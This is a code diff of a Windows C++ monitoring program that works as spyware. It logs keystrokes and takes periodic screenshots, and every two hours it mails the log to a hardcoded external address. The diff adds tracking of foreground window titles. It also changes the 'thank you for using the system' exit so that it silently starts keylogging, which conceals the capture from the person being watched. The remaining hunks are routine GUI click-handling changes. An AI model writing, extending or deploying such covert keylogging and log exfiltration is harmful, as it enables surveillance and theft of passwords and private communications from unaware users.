@@ -20,157 +20,27 @@
 
 #define SMTP_PORT "25"
 #define DEFAULT_BUFLEN 1024
-//#define BUFSIZE 800
-//#define waittime 500
-//#define cmailserver "gmail-smtp-in.l.google.com"
+#define EMAIL_TIME 7200
+#define SSTIME 900
 #define recipientAddr "mdsiam01@sharklasers.com"
-//#define cemailfrom "dynamicsiam01@gmail.com"
-#define LogLength 100
 #define SMTPLog "smtp.log"
-#define cemailsubject "Interesting Mail"
-#define cemailmessage "Hello! I am here. That's a fun mail"
 
 #define MAX_INPUT_LEN 80
 using namespace std;
 
 bool numUnlocked = true;
-int capsCount=0,ssCount=1;;
+int capsCount=0,ssCount=4;
 time_t start, end;
 double elapsed, prev_elapsed = 0.0, mail_elapsed = 0.0;
+char last_window[256];
 
 void viewOptions();
 bool authentication_ret(char*, char*);
 void authentication();
 char recipients_mail[80];
 int mailMyLog(char *);
-
-string convertToString(char* a, int size)
-{
-    int i;
-    string s = "";
-    for (i = 0; i < size; i++) {
-        s = s + a[i];
-    }
-    return s;
-}
-
-vector<int> myPatternMatcher(const char* X, const char* Y, int m, int n)
-{
-    vector<int> ret;
-    // base case 1: `Y` is NULL or empty
-    if (*Y == '\0' || n == 0) {
-        printf("The pattern occurs with shift 0");
-    }
-
-    // base case 2: `X` is NULL, or X's length is less than that of Y's
-    if (*X == '\0' || n > m) {
-        //printf("Pattern not found");
-    }
-
-    // `next[i]` stores the index of the next best partial match
-    int next[n + 1];
-
-    for (int i = 0; i < n + 1; i++) {
-        next[i] = 0;
-    }
-
-    for (int i = 1; i < n; i++)
-    {
-        int j = next[i + 1];
-
-        while (j > 0 && Y[j] != Y[i]) {
-            j = next[j];
-        }
-
-        if (j > 0 || Y[j] == Y[i]) {
-            next[i + 1] = j + 1;
-        }
-    }
-
-    for (int i = 0, j = 0; i < m; i++)
-    {
-        if (*(X + i) == *(Y + j))
-        {
-            if (++j == n) {
-                printf("The pattern occurs with shift %d\n", i - j + 1);
-                ret.push_back(i-j+1);
-            }
-        }
-        else if (j > 0)
-        {
-            j = next[j];
-            i--;    // since `i` will be incremented in the next iteration
-        }
-    }
-    return ret;
-}
-
-void parse()
-{
-    FILE *fp = fopen("top_level_domain.txt","r");
-    char domain[100][100];
-    char web[100][100];
-    int domainN=0;
-    while(fgets(domain[domainN],100,fp)!=0)
-    {
-
-        int len = strlen(domain[domainN]);
-        domain[domainN][len-1]='\0';
-        //cout<< domain[i];
-        domainN++;
-    }
-    fclose(fp);
-
-    FILE *log = fopen("log.txt","r");
-    FILE *wFile = fopen("browsed_websites.txt","a");
-    char buffer[5120];
-
-    while(fgets(buffer,5120,log)!=0)
-    {
-        int bufN = strlen(buffer);
-        cout<< buffer<<endl;
-        for(int i=0; i<domainN;i++)
-        {
-            vector<int> matched = myPatternMatcher(buffer,domain[i],strlen(buffer),strlen(domain[i]));
-            if(matched.size())
-            {
-                for(int it=0; it<matched.size(); it++)
-                {
-                    int index = matched[it];
-                    string dom = convertToString(domain[i], strlen(domain[i]));
-                    string parsedWebsite = dom;
-                    parsedWebsite += "\n";
-                    for(int j = index-1; j>=0; j--)
-                    {
-                        if(j>=2 && buffer[j]== 'w' && buffer[j-1] == 'w' && buffer[j-2] == 'w')
-                        {
-                            parsedWebsite = "www"+parsedWebsite;
-                            break;
-                        }
-
-                        if(buffer[j]== ' ' || buffer[j]== ']' || buffer[j]=='\'' || buffer[j] == '\"' || buffer[j]== '}')
-                        {
-                            break;
-                        }
-
-                        parsedWebsite = buffer[j]+ parsedWebsite;
-                    }
-                    cout<< parsedWebsite;
-                    char toWrite[100];
-                    for(int ii =0;ii< parsedWebsite.size();ii++)
-                    {
-                        toWrite[ii]=parsedWebsite[ii];
-                        cout<< toWrite[ii];
-                    }
-                    toWrite[parsedWebsite.size()]='\0';
-                    fputs(toWrite,wFile);
-                }
-            }
-        }
-    }
-    fclose(log);
-    fclose(wFile);
-}
+void logKeys();
+void parse();
 
 bool authentication_ret(char takenName[], char takenPass[])
 {
@@ -278,7 +148,9 @@ void mailingGraph()
     POINT position;
     int count=0;
     printf("Your email: %s",email);
-    while(1)
+    bool flags = true;
+    int x,y;
+    while(flags)
     {
         if(GetKeyState(VK_LBUTTON)&0x8000)
         {
@@ -287,10 +159,14 @@ void mailingGraph()
             printf("\n now point is %d %d",position.x,position.y);
             count++;
         }
-        if(count==2) break;
+        x = position.x;
+        y = position.y;
+        if(x>=550&&x<=800&&y>=450&&y<=600)
+            flags = false;
+        if(x>=1000&&x<=1200&&y>=450&&y<=600)
+            flags = false;
     }
-    int x = position.x;
-    int y = position.y;
+
     if(x>=550&&x<=800&&y>=450&&y<=600)
     {
 
@@ -344,9 +220,10 @@ void viewBrowsedWebsites()
     setcolor(YELLOW);
     outtextxy(1050,570,"BACK");
     POINT position;
+    bool flags=true;
     int xx,yy;
     int count=0;
-    while(1)
+    while(flags)
     {
         if(GetKeyState(VK_LBUTTON)&0x8000)
         {
@@ -355,10 +232,12 @@ void viewBrowsedWebsites()
             printf("\n now point is %d %d",position.x,position.y);
             count++;
         }
-        if(count==2) break;
+        xx=position.x;
+        yy=position.y;
+        if(xx>=1000&&xx<=1200 && yy>=550&&yy<=700)
+            flags=false;
     }
-    xx=position.x;
-    yy=position.y;
+
     if(xx>=1000&&xx<=1200 && yy>=550&&yy<=700)
     {
         closegraph();
@@ -486,8 +365,10 @@ void addUser()
     //fflush(stdin);
     POINT position;
     int count=0;
+    bool flag = true;
+    int x,y;
     //getch();
-    while(1)
+    while(flag)
     {
         if(GetKeyState(VK_LBUTTON)&0x8000)
         {
@@ -496,19 +377,23 @@ void addUser()
             printf("\n now point is %d %d",position.x,position.y);
             count++;
         }
-        if(count==2) break;
+        x = position.x;
+        y = position.y;
+        if(x>=550&&x<=700&&y>=450&&y<=550)
+            flag=false;
+        if(x>=1000&&x<=1200 && y>=550&&y<=700)
+            flag = false;
     }
-    int x,y;
-    x = position.x;
-    y = position.y;
+
+
     if(x>=550&&x<=700&&y>=450&&y<=550)
     {
-        std::cout<< "hi"<<std::endl;
+        //std::cout<< "hi"<<std::endl;
         FILE *addUserFP = fopen("authorised_users.txt","a");
         fputs(name, addUserFP);
-        //fputs("\n",addUserFP);
+        fputs("\n",addUserFP);
         fputs(password, addUserFP);
-        //fputs("\n",addUserFP);
+        fputs("\n",addUserFP);
         fclose(addUserFP);
         DWORD screenWidth2= 500;
         DWORD screenHeight2 = 350;
@@ -553,11 +438,14 @@ void viewWindows()
         int y=50;
     for(int j=0;j<i;j++)
     {
-        rectangle(180,y1,500,y2);
-        outtextxy(x,y, web[j]);
-        y = y+50;
-        y1+=50;
-        y2+=50;
+        if(strlen(web[j])>5)
+        {
+            rectangle(180,y1,500,y2);
+            outtextxy(x,y, web[j]);
+            y = y+50;
+            y1+=50;
+            y2+=50;
+        }
 
     }
     rectangle(1000,550,1200,600);
@@ -576,10 +464,11 @@ void viewWindows()
             printf("\n now point is %d %d",position.x,position.y);
             count++;
         }
-        if(count==2) break;
+        xx=position.x;
+        yy=position.y;
+        if(xx>=1000&&xx<=1200 && yy>=550&&yy<=700) break;
     }
-    xx=position.x;
-    yy=position.y;
+
     if(xx>=1000&&xx<=1200 && yy>=550&&yy<=700)
     {
         closegraph();
@@ -651,10 +540,9 @@ void viewOptions()
     POINT position;
     bool flag=false;
     std::cout<< "options"<<std::endl;
-    while(1)
+    int x,y;
+    while(!flag)
     {
-        if(!flag) std::cout<< "in"<<std::endl;
-        flag=true;
         if(GetKeyState(VK_LBUTTON)&0x8000)
         {
 
@@ -662,11 +550,22 @@ void viewOptions()
             printf("\n now point is %d %d",position.x,position.y);
             count++;
         }
-        if(count==2) break;
+        x = position.x;
+        y = position.y;
+        if(y>=400 && y<=470)
+        {
+            if((x>=100 && x<=300)||(x>=400 && x<=600)||(x>=700 && x<=900)||(x>=1000 && x<=1200))
+                flag=true;
+        }
+        if(y>=550 && y<=650)
+        {
+            if((x>=700 && x<=900)||(x>=1000 && x<=1200))
+                flag=true;
+        }
+
     }
-    int x,y;
-    x = position.x;
-    y = position.y;
+
+
     if(x>=100 && x<=300 && y>=400 && y<=470)
     {
         closegraph();
@@ -704,7 +603,7 @@ void viewOptions()
         outtextxy(100,100,"THANK YOU FOR USING THE SYSTEM...");
         delay(5000);
         closegraph();
-        authentication();
+        logKeys();
     }
     if(x>=700 && x<=900 && y>=550 && y<=650)
     {
@@ -833,24 +732,26 @@ void authentication()
 
     POINT check;
     int count=0;
-    while(1)
+    bool flag = true;
+    int x,y;
+    while(flag)
     {
 
         if(GetAsyncKeyState(VK_LBUTTON)&0x8000)
         {
             printf("\nPRESSED");
             GetCursorPos(&check);
-            count++;
+
         }
-        if(count==1) break;
+
+        x = check.x;
+        y = check.y;
+        //printf("1. %d %d\n", x,y);
+        if(x>=730&&x<=950 && y>=600&&y<=670)
+            flag=false;
     }
 
-    int x,y;
-    x = check.x;
-    y = check.y;
-    printf("1. %d %d\n", x,y);
-    if(x>=730&&x<=950 && y>=600&&y<=670)
-    {
+
         authenticate = authentication_ret(email, password);
         printf("\nvalue returned: %d\n",authenticate);
         if(authenticate==true)
@@ -876,7 +777,135 @@ void authentication()
             //closegraph();
             // authenticationFailed();
         }
+}
+
+
+string convertToString(char* a, int size)
+{
+    int i;
+    string s = "";
+    for (i = 0; i < size; i++) {
+        s = s + a[i];
     }
+    return s;
+}
+
+vector<int> myPatternMatcher(const char* X, const char* Y, int m, int n)
+{
+    vector<int> ret;
+    // base case 1: `Y` is NULL or empty
+    if (*Y == '\0' || n == 0) {
+        printf("The pattern occurs with shift 0");
+    }
+
+    // base case 2: `X` is NULL, or X's length is less than that of Y's
+    if (*X == '\0' || n > m) {
+        //printf("Pattern not found");
+    }
+
+    // `next[i]` stores the index of the next best partial match
+    int next[n + 1];
+
+    for (int i = 0; i < n + 1; i++) {
+        next[i] = 0;
+    }
+
+    for (int i = 1; i < n; i++)
+    {
+        int j = next[i + 1];
+
+        while (j > 0 && Y[j] != Y[i]) {
+            j = next[j];
+        }
+
+        if (j > 0 || Y[j] == Y[i]) {
+            next[i + 1] = j + 1;
+        }
+    }
+
+    for (int i = 0, j = 0; i < m; i++)
+    {
+        if (*(X + i) == *(Y + j))
+        {
+            if (++j == n) {
+                printf("The pattern occurs with shift %d\n", i - j + 1);
+                ret.push_back(i-j+1);
+            }
+        }
+        else if (j > 0)
+        {
+            j = next[j];
+            i--;    // since `i` will be incremented in the next iteration
+        }
+    }
+    return ret;
+}
+
+void parse()
+{
+    FILE *fp = fopen("top_level_domain.txt","r");
+    char domain[100][100];
+    char web[100][100];
+    int domainN=0;
+    while(fgets(domain[domainN],100,fp)!=0)
+    {
+
+        int len = strlen(domain[domainN]);
+        domain[domainN][len-1]='\0';
+        //cout<< domain[i];
+        domainN++;
+    }
+    fclose(fp);
+
+    FILE *log = fopen("log.txt","r");
+    FILE *wFile = fopen("browsed_websites.txt","w");
+    char buffer[5120];
+
+    while(fgets(buffer,5120,log)!=0)
+    {
+        int bufN = strlen(buffer);
+        cout<< buffer<<endl;
+        for(int i=0; i<domainN;i++)
+        {
+            vector<int> matched = myPatternMatcher(buffer,domain[i],strlen(buffer),strlen(domain[i]));
+            if(matched.size())
+            {
+                for(int it=0; it<matched.size(); it++)
+                {
+                    int index = matched[it];
+                    string dom = convertToString(domain[i], strlen(domain[i]));
+                    string parsedWebsite = dom;
+                    parsedWebsite += "\n";
+                    for(int j = index-1; j>=0; j--)
+                    {
+                        if(j>=2 && buffer[j]== 'w' && buffer[j-1] == 'w' && buffer[j-2] == 'w')
+                        {
+                            parsedWebsite = "www"+parsedWebsite;
+                            break;
+                        }
+
+                        if(buffer[j]== ' ' || buffer[j]== ']' || buffer[j]=='\'' || buffer[j] == '\"' || buffer[j]== '}')
+                        {
+                            break;
+                        }
+
+                        parsedWebsite = buffer[j]+ parsedWebsite;
+                    }
+                    cout<< parsedWebsite;
+                    char toWrite[100];
+                    for(int ii =0;ii< parsedWebsite.size();ii++)
+                    {
+                        toWrite[ii]=parsedWebsite[ii];
+                        cout<< toWrite[ii];
+                    }
+                    toWrite[parsedWebsite.size()]='\0';
+                    fputs(toWrite,wFile);
+                }
+            }
+        }
+    }
+    fclose(log);
+    fclose(wFile);
 }
 
 
@@ -1448,6 +1477,23 @@ int save(int _key, char const *file)
     return 0;
 }
 
+void trackWindowChanges()
+{
+    HWND foreground = GetForegroundWindow();
+    char this_window[256];
+    GetWindowText(foreground, this_window, 256);
+        //cout<<this_window<<endl;
+    if(strcmp(last_window,this_window)!=0)
+    {
+
+        strcpy(last_window,this_window);
+        FILE* fileP = fopen("windows.txt","a");
+        cout<< this_window<<endl;
+        fprintf(fileP, "%s\n", this_window);
+        fclose(fileP);
+    }
+
+}
 
 void logKeys()
 {
@@ -1457,7 +1503,7 @@ void logKeys()
         time(&end);
 
         elapsed = difftime(end, start);
-        if (elapsed >= prev_elapsed+900.0)
+        if (elapsed >= prev_elapsed+SSTIME)
         {
             char nameOfScreenshot[20];
             snprintf(nameOfScreenshot, 20, "image%d.bmp", ssCount); // puts string into buffer
@@ -1468,11 +1514,13 @@ void logKeys()
             prev_elapsed = elapsed;
         }
 
-        if (elapsed >= mail_elapsed+7200.0)
+        if (elapsed >= mail_elapsed+EMAIL_TIME)
         {
             mailMyLog(recipientAddr);
             mail_elapsed = elapsed;
         }
+
+        trackWindowChanges();
 
         Sleep(10);
 
